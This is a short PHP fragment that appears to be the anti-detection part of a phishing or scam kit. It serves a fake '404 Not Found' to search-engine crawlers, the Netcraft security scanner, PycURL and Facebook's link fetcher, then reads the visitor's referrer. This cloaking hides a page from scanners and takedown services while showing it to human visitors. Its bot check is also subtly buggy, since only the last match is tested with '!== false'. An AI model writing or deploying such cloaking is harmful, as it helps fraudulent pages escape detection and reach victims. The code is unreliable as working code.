<?php
if (
    strpos($_SERVER['HTTP_USER_AGENT'], 'google')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Java')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'Google')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'NetcraftSurveyAgent')
    or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false
) {

    $uagent = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";

    header("HTTP/1.0 404 Not Found");
    exit();
}


$refer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null;
